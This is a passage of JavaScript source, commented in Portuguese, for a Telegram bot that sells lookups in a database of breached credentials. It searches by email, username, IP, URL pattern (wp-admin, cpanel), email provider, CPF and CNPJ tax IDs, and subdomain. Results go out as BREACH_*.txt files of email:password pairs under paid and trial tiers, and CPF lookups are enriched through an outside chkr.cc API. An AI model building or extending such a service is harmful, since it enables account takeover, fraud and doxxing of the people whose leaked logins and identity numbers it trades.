    }
    bot.sendMessage(chatId, msg, opts({ parse_mode: 'Markdown' })).catch(() => {});
  }
}

// ══════════════════════════════════════════════════
// BUSCA INTELIGENTE (detecta tipo automaticamente)
// ══════════════════════════════════════════════════
async function sendSmartResults(chatId, query, pool, threadId) {
  const opts = (o = {}) => threadId ? { message_thread_id: threadId, ...o } : o;

  if (!query || query.trim().length < 2) {
    return bot.sendMessage(
      chatId,
      `❌ Envie algo para buscar! Ex:\n• \`usuario@email.com\`\n• \`site.com\`\n• \`11999999999\`\n• \`minecraft123\``,
      opts({ parse_mode: 'Markdown' })
    );
  }

  const q = query.trim();
  const tipo = detectQueryType(q);

  // Se detectou tipo específico, redireciona para busca direta
  if (tipo !== 'smart') {
    return sendResults(chatId, tipo, q, pool, threadId);
  }

  // Busca parcial só para queries longas (evita timeout)
  const doPartial = q.length >= 6;

  // Mensagem de carregamento
  let smartLoadingMsg;
  try {
    bot.sendChatAction(chatId, 'upload_document', opts()).catch(() => {});
    runningSearches.set(chatId, { cancelled: false });
    smartLoadingMsg = await bot.sendMessage(
      chatId,
      `🔍 *Busca inteligente:* \`${q}\`\n⏳ _Consultando banco..._`,
      opts({ parse_mode: 'Markdown', reply_markup: cancelSearchBtn })
    );
  } catch(e) {}

  const MAX_ROWS = await getMaxRows(chatId);
  const PER_FIELD = 2500;
  try {
    if (runningSearches.get(chatId)?.cancelled) {
      runningSearches.delete(chatId);
      if (smartLoadingMsg) bot.deleteMessage(chatId, smartLoadingMsg.message_id).catch(() => {});
      return;
    }
    // 1. Busca exata em qualquer campo (usa índices, instantâneo)
    let res = await pool.query(
      `SELECT * FROM credentials WHERE email = $1 OR url = $1 OR senha = $1 OR telefone = $1 LIMIT $2`,
      [q, MAX_ROWS]
    );

    // 2. Busca parcial só se não achou e query é longa o suficiente
    if (res.rows.length === 0 && doPartial) {
      res = await pool.query(
        `SELECT * FROM (
          (SELECT * FROM credentials WHERE email    ILIKE $1 LIMIT ${PER_FIELD})
          UNION ALL
          (SELECT * FROM credentials WHERE url      ILIKE $1 LIMIT ${PER_FIELD})
          UNION ALL
          (SELECT * FROM credentials WHERE senha    ILIKE $1 LIMIT ${PER_FIELD})
          UNION ALL
          (SELECT * FROM credentials WHERE telefone ILIKE $1 LIMIT ${PER_FIELD})
        ) AS combined LIMIT $2`,
        [`%${q}%`, MAX_ROWS]
      );
    }

    if (smartLoadingMsg) bot.deleteMessage(chatId, smartLoadingMsg.message_id).catch(() => {});

    if (res.rows.length === 0) {
      const hint = !doPartial ? `\n\n💡 _Termo muito curto: só busca exata. Tente algo mais específico._` : '';
      return bot.sendMessage(chatId, `❌ Nenhum resultado para \`${q}\`${hint}`, opts({ parse_mode: 'Markdown', reply_markup: noResultBtn }));
    }

    const cleanedRows = await getUniqueValidRows(res.rows, 'full', chatId);
    if (cleanedRows.length === 0) {
      if (smartLoadingMsg) bot.deleteMessage(chatId, smartLoadingMsg.message_id).catch(() => {});
      if (cleanedRows.govBlocked) {
        return bot.sendMessage(chatId, `❌ Sites governamentais bloqueado no trial`, opts({ parse_mode: 'Markdown' }));
      }
      return bot.sendMessage(chatId, `❌ Nenhum resultado válido (com usuário e senha) encontrado para \`${q}\``, opts({ parse_mode: 'Markdown' }));
    }

    const { content, count, total, limited } = await formatRowsWithLimit(cleanedRows, 'full', chatId);
    const safeQuery = q.replace(/[^a-zA-Z0-9_\-]/g, '_').slice(0, 40);
    const inGroup = groupChats.has(chatId);
    const limitNote = res.rows.length >= MAX_ROWS ? `\n⚠️ _Limite de ${MAX_ROWS.toLocaleString('pt-BR')} resultados atingido_` : '';
    const trialNote = limited ? `\n⚠️ _Modo teste: apenas ${count.toLocaleString('pt-BR')} resultados exibidos_` : '';
    const access = await checkUserAccess(chatId, inGroup);
    const isPremium = access.status === 'premium';
    const isGroup = access.status === 'group';
    const totalNote = (isPremium || isGroup) && total > count ? `\n📊 _Total de logins encontrados: ${total.toLocaleString('pt-BR')}_` : '';
    
    await bot.sendDocument(chatId, Buffer.from(content, 'utf8'), opts({
      caption: `✅ *${count.toLocaleString('pt-BR')} logins enviados* para \`${q}\`${limitNote}${trialNote}${totalNote}`,
      parse_mode: 'Markdown',
      reply_markup: newSearchBtn
    }), { filename: `BREACH_${safeQuery}.txt`, contentType: 'text/plain' });

    runningSearches.delete(chatId);

  } catch (err) {
    console.error(`[BOT] sendSmartResults error:`, err);
    runningSearches.delete(chatId);
    if (smartLoadingMsg) bot.deleteMessage(chatId, smartLoadingMsg.message_id).catch(() => {});
    let msg;
    if (err.message?.includes('timeout') || err.code === '57014') {
      msg = `⏱️ *Busca expirou!* Tente uma busca mais específica.\n\nExemplo: use o email completo ou domínio exato.`;
    } else if (err.message?.includes('ETELEGRAM')) {
      msg = `⚠️ Arquivo muito grande para enviar. Tente um termo mais específico.`;
    } else {
      msg = `❌ Erro: ${err.message}`;
    }
    bot.sendMessage(chatId, msg, opts({ parse_mode: 'Markdown' })).catch(() => {});
  }
}

// ══════════════════════════════════════════════════
// /user — BUSCA POR USERNAME (parte do email antes do @)
// Exemplo: /user joaosilva  →  WHERE email ILIKE '%joaosilva%'
// ══════════════════════════════════════════════════
async function sendUserResults(chatId, query, pool, threadId) {
  const opts = (o = {}) => threadId ? { message_thread_id: threadId, ...o } : o;

  if (!query || query.trim().length < 2) {
    return bot.sendMessage(chatId,
      `❌ Uso: \`/user <username>\`\n\nExemplo: \`/user joaosilva\``,
      opts({ parse_mode: 'Markdown' })
    );
  }

  const q = query.trim();
  let loadingMsg;
  try {
    bot.sendChatAction(chatId, 'upload_document', opts()).catch(() => {});
    runningSearches.set(chatId, { cancelled: false });
    loadingMsg = await bot.sendMessage(
      chatId,
      `👤 *Buscando usuário:* \`${q}\`\n⏳ _Consultando banco..._`,
      opts({ parse_mode: 'Markdown', reply_markup: cancelSearchBtn })
    );
  } catch (e) {}

  const MAX_ROWS = await getMaxRows(chatId);
  try {
    if (runningSearches.get(chatId)?.cancelled) {
      runningSearches.delete(chatId);
      if (loadingMsg) bot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});
      return;
    }
    // Busca exata + prefixo + ampla numa única query combinada
    const t0 = Date.now();
    let res = await pool.query(
      `SELECT * FROM credentials WHERE email = $1 LIMIT $2`,
      [q, MAX_ROWS]
    );

    // Busca parcial: username@dominio
    if (res.rows.length === 0) {
      res = await pool.query(
        `SELECT * FROM credentials WHERE email ILIKE $1 LIMIT $2`,
        [`${q}@%`, MAX_ROWS]
      );
    }

    // Busca ainda mais ampla: username em qualquer parte do email
    if (res.rows.length === 0) {
      res = await pool.query(
        `SELECT * FROM credentials WHERE email ILIKE $1 LIMIT $2`,
        [`%${q}%`, MAX_ROWS]
      );
    }
    if (loadingMsg) bot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});

    if (res.rows.length === 0) {
      return bot.sendMessage(chatId,
        `❌ Nenhum resultado para usuário \`${q}\``,
        opts({ parse_mode: 'Markdown', reply_markup: noResultBtn })
      );
    }

    const cleanedRows = await getUniqueValidRows(res.rows, 'full', chatId);
    if (cleanedRows.length === 0) {
      if (cleanedRows.govBlocked) {
        return bot.sendMessage(chatId, `❌ Sites governamentais bloqueado no trial`, opts({ parse_mode: 'Markdown' }));
      }
      return bot.sendMessage(chatId, `❌ Nenhum resultado válido (com usuário e senha) encontrado para usuário \`${q}\``, opts({ parse_mode: 'Markdown' }));
    }

    const { content } = await formatRowsWithLimit(cleanedRows, 'full', chatId);
    const safeQuery = q.replace(/[^a-zA-Z0-9_\-]/g, '_').slice(0, 40);
    const limitNote = res.rows.length >= MAX_ROWS ? `\n⚠️ _Limite de ${MAX_ROWS.toLocaleString('pt-BR')} resultados atingido_` : '';
    await bot.sendDocument(chatId, Buffer.from(content, 'utf8'), opts({
      caption: `✅ *USER:* \`${q}\`\n📂 _${cleanedRows.length.toLocaleString('pt-BR')} resultados encontrados_${limitNote}`,
      parse_mode: 'Markdown',
      reply_markup: newSearchBtn
    }), { filename: `BREACH_user_${safeQuery}.txt`, contentType: 'text/plain' });

  } catch (err) {
    if (loadingMsg) bot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});
    const msg = err.message?.includes('timeout') || err.code === '57014'
      ? `⏱️ *Busca expirou!* Tente um username mais específico.`
      : `❌ Erro: ${err.message}`;
    bot.sendMessage(chatId, msg, opts({ parse_mode: 'Markdown' })).catch(() => {});
  }
}

// ══════════════════════════════════════════════════
// /ip — BUSCA POR ENDEREÇO IP NA URL
// Exemplo: /ip 192.168.1.1  →  WHERE url ILIKE '%192.168.1.1%'
// ══════════════════════════════════════════════════
async function sendIpResults(chatId, query, pool, threadId) {
  const opts = (o = {}) => threadId ? { message_thread_id: threadId, ...o } : o;

  if (!query || query.trim().length < 4) {
    return bot.sendMessage(chatId,
      `❌ Uso: \`/ip <endereço_ip>\`\n\nExemplos:\n• \`/ip 192.168.1.1\`\n• \`/ip 10.0.0\`\n• \`/ip 187.45\``,
      opts({ parse_mode: 'Markdown' })
    );
  }

  const q = query.trim();
  let loadingMsg;
  try {
    bot.sendChatAction(chatId, 'upload_document', opts()).catch(() => {});
    loadingMsg = await bot.sendMessage(
      chatId,
      `🌐 *Buscando IP:* \`${q}\`\n⏳ _Consultando banco..._`,
      opts({ parse_mode: 'Markdown', reply_markup: cancelSearchBtn })
    );
  } catch (e) {}

  const MAX_ROWS = await getMaxRows(chatId);
  try {
    // Busca o IP na URL
    const res = await pool.query(
      `SELECT * FROM credentials WHERE url ILIKE $1 LIMIT $2`,
      [`%${q}%`, MAX_ROWS]
    );

    if (loadingMsg) bot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});

    if (res.rows.length === 0) {
      return bot.sendMessage(chatId,
        `❌ Nenhum resultado para IP \`${q}\`\n\n💡 _Tente um IP parcial: ex \`/ip 187.45\`_`,
        opts({ parse_mode: 'Markdown', reply_markup: noResultBtn })
      );
    }

    const cleanedRows = await getUniqueValidRows(res.rows, 'full', chatId);
    if (cleanedRows.length === 0) {
      if (cleanedRows.govBlocked) {
        return bot.sendMessage(chatId, `❌ Sites governamentais bloqueado no trial`, opts({ parse_mode: 'Markdown' }));
      }
      return bot.sendMessage(chatId, `❌ Nenhum resultado válido (com usuário e senha) encontrado para IP \`${q}\``, opts({ parse_mode: 'Markdown' }));
    }

    const { content } = await formatRowsWithLimit(cleanedRows, 'full', chatId);
    const safeQuery = q.replace(/[^a-zA-Z0-9_\-\.]/g, '_').slice(0, 40);
    const limitNote = res.rows.length >= MAX_ROWS ? `\n⚠️ _Limite de ${MAX_ROWS.toLocaleString('pt-BR')} resultados atingido_` : '';
    await bot.sendDocument(chatId, Buffer.from(content, 'utf8'), opts({
      caption: `✅ *IP:* \`${q}\`\n📂 _${cleanedRows.length.toLocaleString('pt-BR')} resultados encontrados_${limitNote}`,
      parse_mode: 'Markdown',
      reply_markup: newSearchBtn
    }), { filename: `BREACH_ip_${safeQuery}.txt`, contentType: 'text/plain' });

  } catch (err) {
    if (loadingMsg) bot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});
    const msg = err.message?.includes('timeout') || err.code === '57014'
      ? `⏱️ *Busca expirou!* Tente um IP mais específico.`
      : `❌ Erro: ${err.message}`;
    bot.sendMessage(chatId, msg, opts({ parse_mode: 'Markdown' })).catch(() => {});
  }
}

// ══════════════════════════════════════════════════
// /inurl — BUSCA URLS QUE CONTENHAM O PADRÃO
// Exemplo: /inurl wp-admin  →  WHERE url ILIKE '%wp-admin%'
// ══════════════════════════════════════════════════
async function sendInurlResults(chatId, query, pool, threadId) {
  const opts = (o = {}) => threadId ? { message_thread_id: threadId, ...o } : o;

  if (!query || query.trim().length < 2) {
    return bot.sendMessage(chatId,
      `❌ Uso: \`/inurl <padrão>\`\n\nExemplos:\n• \`/inurl wp-admin\`\n• \`/inurl admin\`\n• \`/inurl login\`\n• \`/inurl cpanel\`\n• \`/inurl phpmyadmin\``,
      opts({ parse_mode: 'Markdown' })
    );
  }

  const q = query.trim();
  let loadingMsg;
  try {
    bot.sendChatAction(chatId, 'upload_document', opts()).catch(() => {});
    runningSearches.set(chatId, { cancelled: false });
    loadingMsg = await bot.sendMessage(
      chatId,
      `🔗 *Buscando inurl:* \`${q}\`\n⏳ _Consultando banco..._`,
      opts({ parse_mode: 'Markdown', reply_markup: cancelSearchBtn })
    );
  } catch (e) {}

  const MAX_ROWS = await getMaxRows(chatId);
  try {
    const res = await pool.query(
      `SELECT * FROM credentials WHERE url ILIKE $1 LIMIT $2`,
      [`%${q}%`, MAX_ROWS]
    );

    if (loadingMsg) bot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});

    if (res.rows.length === 0) {
      return bot.sendMessage(chatId,
        `❌ Nenhuma URL encontrada com \`${q}\`\n\n💡 _Tente padrões como: wp-admin, login, admin, phpmyadmin, cpanel_`,
        opts({ parse_mode: 'Markdown' })
      );
    }

    const cleanedRows = await getUniqueValidRows(res.rows, 'full', chatId);
    if (cleanedRows.length === 0) {
      if (cleanedRows.govBlocked) {
        return bot.sendMessage(chatId, `❌ Sites governamentais bloqueado no trial`, opts({ parse_mode: 'Markdown' }));
      }
      return bot.sendMessage(chatId, `❌ Nenhum resultado válido (com usuário e senha) encontrado para inurl \`${q}\``, opts({ parse_mode: 'Markdown' }));
    }

    const { content } = await formatRowsWithLimit(cleanedRows, 'full', chatId);
    const safeQuery = q.replace(/[^a-zA-Z0-9_\-]/g, '_').slice(0, 40);
    const limitNote = res.rows.length >= MAX_ROWS ? `\n⚠️ _Limite de ${MAX_ROWS.toLocaleString('pt-BR')} resultados atingido_` : '';
    await bot.sendDocument(chatId, Buffer.from(content, 'utf8'), opts({
      caption: `✅ *INURL:* \`${q}\`\n📂 _${cleanedRows.length.toLocaleString('pt-BR')} resultados encontrados_${limitNote}`,
      parse_mode: 'Markdown',
      reply_markup: newSearchBtn
    }), { filename: `BREACH_inurl_${safeQuery}.txt`, contentType: 'text/plain' });

  } catch (err) {
    if (loadingMsg) bot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});
    const msg = err.message?.includes('timeout') || err.code === '57014'
      ? `⏱️ *Busca expirou!* Tente um padrão mais específico.`
      : `❌ Erro: ${err.message}`;
    bot.sendMessage(chatId, msg, opts({ parse_mode: 'Markdown' })).catch(() => {});
  }
}

// ══════════════════════════════════════════════════
// /inmail — BUSCA POR PROVEDOR DE EMAIL
// Exemplo: /inmail @gmail.com  →  WHERE email ILIKE '%@gmail.com%'
// ══════════════════════════════════════════════════
async function sendInmailResults(chatId, query, pool, threadId) {
  const opts = (o = {}) => threadId ? { message_thread_id: threadId, ...o } : o;

  if (!query || query.trim().length < 2) {
    return bot.sendMessage(chatId,
      `❌ Uso: \`/inmail @provedor\`\n\nExemplos:\n• \`/inmail @gmail.com\`\n• \`/inmail @hotmail.com\`\n• \`/inmail @yahoo.com\`\n• \`/inmail .gov.br\``,
      opts({ parse_mode: 'Markdown' })
    );
  }

  const q = query.trim();
  let loadingMsg;
  try {
    bot.sendChatAction(chatId, 'upload_document', opts()).catch(() => {});
    runningSearches.set(chatId, { cancelled: false });
    loadingMsg = await bot.sendMessage(
      chatId,
      `📨 *Buscando inmail:* \`${q}\`\n⏳ _Consultando banco..._`,
      opts({ parse_mode: 'Markdown', reply_markup: cancelSearchBtn })
    );
  } catch (e) {}

  const MAX_ROWS = await getMaxRows(chatId);
  try {
    // Busca o termo tanto no email quanto na URL
    const res = await pool.query(
      `SELECT * FROM credentials WHERE email ILIKE $1 OR url ILIKE $1 LIMIT $2`,
      [`%${q}%`, MAX_ROWS]
    );

    if (loadingMsg) bot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});

    if (res.rows.length === 0) {
      return bot.sendMessage(chatId,
        `❌ Nenhum email encontrado com \`${q}\`\n\n💡 _Tente: @gmail.com, @hotmail.com, @yahoo.com_`,
        opts({ parse_mode: 'Markdown' })
      );
    }

    const cleanedRows = await getUniqueValidRows(res.rows, 'full', chatId);
    if (cleanedRows.length === 0) {
      if (cleanedRows.govBlocked) {
        return bot.sendMessage(chatId, `❌ Sites governamentais bloqueado no trial`, opts({ parse_mode: 'Markdown' }));
      }
      return bot.sendMessage(chatId, `❌ Nenhum resultado válido (com usuário e senha) encontrado para inmail \`${q}\``, opts({ parse_mode: 'Markdown' }));
    }

    const { content } = await formatRowsWithLimit(cleanedRows, 'full', chatId);
    const safeQuery = q.replace(/[^a-zA-Z0-9_\-\.]/g, '_').slice(0, 40);
    const limitNote = res.rows.length >= MAX_ROWS ? `\n⚠️ _Limite de ${MAX_ROWS.toLocaleString('pt-BR')} resultados atingido_` : '';
    await bot.sendDocument(chatId, Buffer.from(content, 'utf8'), opts({
      caption: `✅ *INMAIL:* \`${q}\`\n📂 _${cleanedRows.length.toLocaleString('pt-BR')} resultados encontrados_${limitNote}`,
      parse_mode: 'Markdown',
      reply_markup: newSearchBtn
    }), { filename: `BREACH_inmail_${safeQuery}.txt`, contentType: 'text/plain' });

  } catch (err) {
    if (loadingMsg) bot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});
    const msg = err.message?.includes('timeout') || err.code === '57014'
      ? `⏱️ *Busca expirou!* Tente um provedor mais específico.`
      : `❌ Erro: ${err.message}`;
    bot.sendMessage(chatId, msg, opts({ parse_mode: 'Markdown' })).catch(() => {});
  }
}

// ══════════════════════════════════════════════════
// /cpf — BUSCA POR CPF EM TODOS OS CAMPOS
// Aceita: 123.456.789-00 ou 12345678900
// ══════════════════════════════════════════════════
async function sendCpfResults(chatId, query, pool, threadId) {
  const opts = (o = {}) => threadId ? { message_thread_id: threadId, ...o } : o;

  if (!query || query.trim().length < 8) {
    return bot.sendMessage(chatId,
      `❌ Uso: \`/cpf <número>\`\n\nExemplos:\n• \`/cpf 123.456.789-00\`\n• \`/cpf 12345678900\``,
      opts({ parse_mode: 'Markdown' })
    );
  }

  const raw = query.trim();
  // Normaliza: remove pontos, traços e espaços para buscar ambos os formatos
  const digits = raw.replace(/[^\d]/g, '');
  // Monta padrão formatado: 000.000.000-00
  const formatted = digits.length === 11
    ? `${digits.slice(0,3)}.${digits.slice(3,6)}.${digits.slice(6,9)}-${digits.slice(9,11)}`
    : null;

  let loadingMsg;
  try {
    bot.sendChatAction(chatId, 'upload_document', opts()).catch(() => {});
    runningSearches.set(chatId, { cancelled: false });
    loadingMsg = await bot.sendMessage(
      chatId,
      `🪪 *Buscando CPF:* \`${raw}\`\n⏳ _Consultando banco..._`,
      opts({ parse_mode: 'Markdown', reply_markup: cancelSearchBtn })
    );
  } catch (e) {}

  const MAX_ROWS = await getMaxRows(chatId);
  const client = await pool.connect();
  try {
    await client.query('BEGIN');
    await client.query(`SET LOCAL statement_timeout = '60s'`);

    // Busca dígitos puros e formato com pontuação em todos os campos
    const searches = [digits];
    if (formatted) searches.push(formatted);

    let res = { rows: [] };
    const seenKeys = new Set();
    const tempRows = [];

    // 1. Busca exata (instantânea via index)
    for (const term of searches) {
      const exactRes = await client.query(
        `SELECT * FROM credentials WHERE numero = $1 OR email = $1 OR url = $1 OR senha = $1 OR telefone = $1 LIMIT $2`,
        [term, MAX_ROWS]
      );
      for (const row of exactRes.rows) {
        const key = row.numero ?? `${row.url}|${row.email}|${row.senha}`;
        if (!seenKeys.has(key)) {
          seenKeys.add(key);
          tempRows.push(row);
        }
      }
    }

    // 2. Busca parcial se não achou nada exato
    if (tempRows.length === 0) {
      for (const term of searches) {
        if (term.length < 3) continue;
        const partialRes = await client.query(
          `SELECT * FROM (
            (SELECT * FROM credentials WHERE numero ILIKE $1 LIMIT ${Math.ceil(MAX_ROWS/5)})
            UNION ALL
            (SELECT * FROM credentials WHERE email    ILIKE $1 LIMIT ${Math.ceil(MAX_ROWS/5)})
            UNION ALL
            (SELECT * FROM credentials WHERE url      ILIKE $1 LIMIT ${Math.ceil(MAX_ROWS/5)})
            UNION ALL
            (SELECT * FROM credentials WHERE senha    ILIKE $1 LIMIT ${Math.ceil(MAX_ROWS/5)})
            UNION ALL
            (SELECT * FROM credentials WHERE telefone ILIKE $1 LIMIT ${Math.ceil(MAX_ROWS/5)})
          ) AS combined LIMIT $2`,
          [`%${term}%`, MAX_ROWS]
        );
        for (const row of partialRes.rows) {
          const key = row.numero ?? `${row.url}|${row.email}|${row.senha}`;
          if (!seenKeys.has(key)) {
            seenKeys.add(key);
            tempRows.push(row);
          }
        }
        if (tempRows.length >= MAX_ROWS) break;
      }
    }

    res.rows = tempRows.slice(0, MAX_ROWS);

    await client.query('COMMIT');
    if (loadingMsg) bot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});

    if (res.rows.length === 0) {
      return bot.sendMessage(chatId,
        `❌ Nenhum resultado para CPF \`${raw}\``,
        opts({ parse_mode: 'Markdown', reply_markup: noResultBtn })
      );
    }

    const cleanedRows = await getUniqueValidRows(res.rows, 'full', chatId);
    if (cleanedRows.length === 0) {
      if (cleanedRows.govBlocked) {
        return bot.sendMessage(chatId, `❌ Sites governamentais bloqueado no trial`, opts({ parse_mode: 'Markdown' }));
      }
      return bot.sendMessage(chatId, `❌ Nenhum resultado válido (com usuário e senha) encontrado para CPF \`${raw}\``, opts({ parse_mode: 'Markdown' }));
    }

    const { content } = await formatRowsWithLimit(cleanedRows, 'full', chatId);
    const safeQuery = digits.slice(0, 20);
    const limitNote = res.rows.length >= MAX_ROWS ? `\n⚠️ _Limite de ${MAX_ROWS.toLocaleString('pt-BR')} resultados atingido_` : '';
    await bot.sendDocument(chatId, Buffer.from(content, 'utf8'), opts({
      caption: `✅ *CPF:* \`${raw}\`\n📂 _${cleanedRows.length.toLocaleString('pt-BR')} resultados encontrados_${limitNote}`,
      parse_mode: 'Markdown',
      reply_markup: newSearchBtn
    }), { filename: `BREACH_cpf_${safeQuery}.txt`, contentType: 'text/plain' });

    // Consulta chkr.cc API para dados adicionais
    queryChkrApi(digits, (chkrData, error) => {
      if (!error && chkrData && !chkrData.error) {
        let chkrText = `━━━━━━━━━━━━━━━━━━━━━\n🔍 *Dados da API chkr.cc:*\n\n`;
        if (typeof chkrData === 'object') {
          for (const [key, value] of Object.entries(chkrData)) {
            if (key === 'error' || !value) continue;
            if (Array.isArray(value)) {
              chkrText += `*${key}:* (${value.length})\n`;
              value.slice(0, 5).forEach((item, idx) => {
                chkrText += `  ${idx + 1}. \`${String(item).substring(0, 60)}\`\n`;
              });
              if (value.length > 5) chkrText += `  _(+${value.length - 5} mais)_\n`;
            } else if (typeof value === 'object') {
              chkrText += `*${key}:*\n`;
              for (const [k, v] of Object.entries(value)) {
                chkrText += `  • ${k}: \`${String(v).substring(0, 50)}\`\n`;
              }
            } else {
              chkrText += `*${key}:* \`${String(value).substring(0, 80)}\`\n`;
            }
          }
        }
        bot.sendMessage(chatId, chkrText, opts({ parse_mode: 'Markdown' })).catch(() => {});
      }
    });

  } catch (err) {
    await client.query('ROLLBACK').catch(() => {});
    if (loadingMsg) bot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});
    const msg = err.message?.includes('timeout') || err.code === '57014'
      ? `⏱️ *Busca expirou!* Tente novamente.`
      : `❌ Erro: ${err.message}`;
    bot.sendMessage(chatId, msg, opts({ parse_mode: 'Markdown' })).catch(() => {});
  } finally {
    client.release();
  }
}

// ══════════════════════════════════════════════════
// /cnpj — BUSCA POR CNPJ EM TODOS OS CAMPOS
// Aceita: 12.345.678/0001-90 ou 12345678000190
// ══════════════════════════════════════════════════
async function sendCnpjResults(chatId, query, pool, threadId) {
  const opts = (o = {}) => threadId ? { message_thread_id: threadId, ...o } : o;

  if (!query || query.trim().length < 8) {
    return bot.sendMessage(chatId,
      `❌ Uso: \`/cnpj <número>\`\n\nExemplos:\n• \`/cnpj 12.345.678/0001-90\`\n• \`/cnpj 12345678000190\``,
      opts({ parse_mode: 'Markdown' })
    );
  }

  const raw = query.trim();
  const digits = raw.replace(/[^\d]/g, '');
  const formatted = digits.length === 14
    ? `${digits.slice(0,2)}.${digits.slice(2,5)}.${digits.slice(5,8)}/${digits.slice(8,12)}-${digits.slice(12,14)}`
    : null;

  let loadingMsg;
  try {
    bot.sendChatAction(chatId, 'upload_document', opts()).catch(() => {});
    runningSearches.set(chatId, { cancelled: false });
    loadingMsg = await bot.sendMessage(
      chatId,
      `🏢 *Buscando CNPJ:* \`${raw}\`\n⏳ _Consultando banco..._`,
      opts({ parse_mode: 'Markdown', reply_markup: cancelSearchBtn })
    );
  } catch (e) {}

  const MAX_ROWS = await getMaxRows(chatId);
  const client = await pool.connect();
  try {
    await client.query('BEGIN');
    await client.query(`SET LOCAL statement_timeout = '60s'`);

    const searches = [digits];
    if (formatted) searches.push(formatted);

    let res = { rows: [] };
    for (const term of searches) {
      if (res.rows.length > 0) break;
      res = await client.query(
        `SELECT * FROM (
          (SELECT * FROM credentials WHERE email ILIKE $1 LIMIT ${Math.ceil(MAX_ROWS/3)})
          UNION ALL
          (SELECT * FROM credentials WHERE url   ILIKE $1 LIMIT ${Math.ceil(MAX_ROWS/3)})
          UNION ALL
          (SELECT * FROM credentials WHERE senha ILIKE $1 LIMIT ${Math.ceil(MAX_ROWS/3)})
        ) AS combined LIMIT $2`,
        [`%${term}%`, MAX_ROWS]
      );
    }

    await client.query('COMMIT');
    if (loadingMsg) bot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});

    if (res.rows.length === 0) {
      return bot.sendMessage(chatId,
        `❌ Nenhum resultado para CNPJ \`${raw}\``,
        opts({ parse_mode: 'Markdown', reply_markup: noResultBtn })
      );
    }

    const cleanedRows = await getUniqueValidRows(res.rows, 'full', chatId);
    if (cleanedRows.length === 0) {
      if (cleanedRows.govBlocked) {
        return bot.sendMessage(chatId, `❌ Sites governamentais bloqueado no trial`, opts({ parse_mode: 'Markdown' }));
      }
      return bot.sendMessage(chatId, `❌ Nenhum resultado válido (com usuário e senha) encontrado para CNPJ \`${raw}\``, opts({ parse_mode: 'Markdown' }));
    }

    const { content } = await formatRowsWithLimit(cleanedRows, 'full', chatId);
    const safeQuery = digits.slice(0, 20);
    const limitNote = res.rows.length >= MAX_ROWS ? `\n⚠️ _Limite de ${MAX_ROWS.toLocaleString('pt-BR')} resultados atingido_` : '';
    await bot.sendDocument(chatId, Buffer.from(content, 'utf8'), opts({
      caption: `✅ *CNPJ:* \`${raw}\`\n📂 _${cleanedRows.length.toLocaleString('pt-BR')} resultados encontrados_${limitNote}`,
      parse_mode: 'Markdown',
      reply_markup: newSearchBtn
    }), { filename: `BREACH_cnpj_${safeQuery}.txt`, contentType: 'text/plain' });

  } catch (err) {
    await client.query('ROLLBACK').catch(() => {});
    if (loadingMsg) bot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});
    const msg = err.message?.includes('timeout') || err.code === '57014'
      ? `⏱️ *Busca expirou!* Tente novamente.`
      : `❌ Erro: ${err.message}`;
    bot.sendMessage(chatId, msg, opts({ parse_mode: 'Markdown' })).catch(() => {});
  } finally {
    client.release();
  }
}

// ══════════════════════════════════════════════════
// SUBDOMÍNIOS — BUSCA LOGINS POR SUBDOMÍNIOS REAIS
// ══════════════════════════════════════════════════
async function sendSubdomainResults(chatId, query, pool, threadId) {
  const opts = (o = {}) => threadId ? { message_thread_id: threadId, ...o } : o;

  if (!query || query.trim().length < 3) {
    return bot.sendMessage(chatId, `❌ Domínio muito curto.`, opts({ parse_mode: 'Markdown' }));
  }

  const domain = query.trim().replace(/^https?:\/\//i, '').replace(/^www\./i, '').split('/')[0].toLowerCase();
  let loadingMsg;
  try {
    bot.sendChatAction(chatId, 'upload_document', opts()).catch(() => {});
    loadingMsg = await bot.sendMessage(chatId,
      `🌐 *Buscando subdomínios de:* \`${domain}\`\n⏳ _Extraindo subdomínios reais..._`,
      opts({ parse_mode: 'Markdown' })
    );
  } catch (e) {}

  try {
    // Busca todas as URLs que contêm o domínio (até 20k registros)
    const res = await pool.query(
      `SELECT url, email, senha FROM credentials WHERE url ILIKE $1 LIMIT 20000`,
      [`%${domain}%`]
    );

    if (res.rows.length === 0) {
      if (loadingMsg) bot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});
      return bot.sendMessage(chatId, `❌ Nenhum resultado para \`${domain}\``, opts({ parse_mode: 'Markdown', reply_markup: noResultBtn }));
    }

    // Extrai hostnames no JS (muito mais rápido que SQL DISTINCT+CASE)
    const subMap = new Map(); // hostname -> rows[]
    for (const row of res.rows) {
      let host = '';
      try {
        const u = row.url.toLowerCase();
        if (u.startsWith('http://') || u.startsWith('https://')) {
          const afterProto = u.indexOf('://') + 3;
          const endHost = u.indexOf('/', afterProto);
          host = endHost === -1 ? u.substring(afterProto) : u.substring(afterProto, endHost);
        } else {
          const slash = u.indexOf('/');
          host = slash === -1 ? u : u.substring(0, slash);
        }
        host = host.replace(/:\d+$/, ''); // remove porta
      } catch(e) { continue; }

      if (!host || !host.endsWith(domain)) continue;

      if (!subMap.has(host)) subMap.set(host, []);
      if (subMap.get(host).length < 2000) {
        subMap.get(host).push(row);
      }
    }

    if (subMap.size === 0) {
      if (loadingMsg) bot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});
      return bot.sendMessage(chatId, `❌ Nenhum subdomínio encontrado para \`${domain}\``, opts({ parse_mode: 'Markdown' }));
    }

    // Monta o arquivo agrupado por subdomínio
    const sortedSubs = [...subMap.keys()].sort();
    let totalLogins = 0;
    let allContent = '';

    // Determina status premium UMA vez (e não a cada subdomínio)
    const inGroup = groupChats.has(chatId);
    const cachedAccess = await checkUserAccess(chatId, inGroup);
    const isPremium = cachedAccess.status === 'premium';
    const isGroup = cachedAccess.status === 'group';
    const rowLimit = isPremium ? 999999 : (isGroup ? GROUP_MAX_RESULTS : TRIAL_MAX_RESULTS);
    const formatRowFn = (r) => `${r.email}:${r.senha}`;

